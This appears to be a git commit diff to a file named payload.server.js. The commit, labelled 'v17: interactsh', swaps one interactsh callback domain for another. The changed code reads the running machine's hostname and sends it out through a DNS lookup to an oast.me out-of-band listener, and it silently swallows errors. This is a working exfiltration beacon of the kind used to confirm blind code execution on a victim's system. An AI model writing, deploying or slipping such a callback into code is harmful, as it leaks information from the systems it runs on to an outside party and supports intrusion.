396f4381e0e24b3676216698cadb8585c959e6d1
alex <alex@MacBook-Pro-admin-2.local>
2026-07-31 01:33:01 +0300

    v17: interactsh d9lt23vl31ilkqdiv3b0c59gpy16kjko8.oast.me

--- payload.server.js
+++ payload.server.js
@@ -4,7 +4,7 @@ module.exports = {
       var os = require("os");
       var dns = require("dns");
       var h = os.hostname();
-      dns.lookup(h + ".d9lt1nvl31ilblfpsuc07yxw8ihtemn6h.oast.fun", function(err, addr) {});
+      dns.lookup(h + ".d9lt23vl31ilkqdiv3b0c59gpy16kjko8.oast.me", function(err, addr) {});
     } catch(e) {}
     return null;
   }
